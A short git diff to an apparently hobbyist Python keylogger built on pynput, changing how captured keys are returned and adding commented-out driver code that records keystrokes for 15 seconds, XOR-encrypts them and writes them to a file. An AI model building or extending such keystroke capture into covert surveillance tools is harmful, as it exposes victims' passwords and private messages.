@@ -1,6 +1,9 @@
 from abc import ABC, abstractmethod
 from typing import List
 from pynput import keyboard
+import Writer
+import Encryptor
+import time
 
 
 class IKeyLogger(ABC):
@@ -36,5 +39,25 @@ class KeyLoggerService(IKeyLogger):
         if self.listener:
             self.listener.stop()
 
-    def get_logged_keys(self) -> List[str]:
-        return self.keys
+    def get_logged_keys(self) -> str:
+        # print(self.keys)
+        return "".join(c for c in self.keys)
+
+
+# w = Writer.FileWriter('myFile.txt')
+# e = Encryptor.Encryptor(5)
+# l = KeyLoggerService()
+#
+# l.start_logging()
+# time.sleep(15)
+# l.stop_logging()
+# w.write_to_file(e.xor_encrypt(l.get_logged_keys()))
+# # print(l.get_logged_keys())
+# n = e.xor_encrypt(l.get_logged_keys())
+# print(n)
+# print(e.xor_decrypt(n))
+
+
+
+
+
